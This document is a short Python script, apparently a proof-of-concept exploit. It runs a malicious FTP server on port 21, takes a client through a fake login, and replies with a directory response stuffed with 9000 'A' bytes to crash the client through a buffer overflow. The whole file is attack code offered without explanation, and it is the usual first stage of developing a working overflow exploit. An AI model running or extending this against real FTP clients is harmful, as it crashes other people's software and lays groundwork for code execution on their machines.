#!/usr/bin/python
import socket
import sys

port = 21

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", port))
    s.listen(5)
    print("[+] FTP server started on port: "+str(port)+"\r\n")
except:
    print("[x] Failed to start the server on port: "+str(port)+"\r\n")

crash   = '\x41'*9000
payload = crash

while True:
    conn, addr = s.accept()
    conn.send('220 FTP Server\r\n')
    print(conn.recv(1024))
    conn.send("331 OK\r\n")
    print(conn.recv(1024))
    conn.send('230 OK\r\n')
    print(conn.recv(1024))
    conn.send('220 "'+payload+'" is current directory\r\n')
            
